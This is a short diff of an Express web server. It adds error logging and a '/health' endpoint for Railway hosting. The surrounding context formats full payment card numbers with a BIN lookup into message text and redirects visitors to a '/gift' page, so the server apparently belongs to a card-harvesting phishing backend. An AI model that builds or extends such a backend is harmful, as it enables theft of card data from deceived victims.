@@ -34,6 +34,15 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, "public")));
 app.use(cookieParser());
 
+// Обработка ошибок
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+});
+
+process.on('uncaughtException', (error) => {
+    console.error('Uncaught Exception:', error);
+});
+
 sequelize.sync()
     .then(() => {
         console.log('Миграции успешно выполнены!');
@@ -50,6 +59,11 @@ ${await binInfoEdit(cardInfo.cardNumber.replace(/\s/g, ""))}
 Номер: <code>${cardInfo.cardNumber.replaceAll(' ', '')}</code>
 💳 Номер: <b>${cardInfo.cardNumber}</b>`;
 }
+
+// Healthcheck endpoint for Railway
+app.get("/health", (req, res) => {
+    res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
+});
 
 app.get("/", async (req, res) => {
     return res.redirect('/gift');
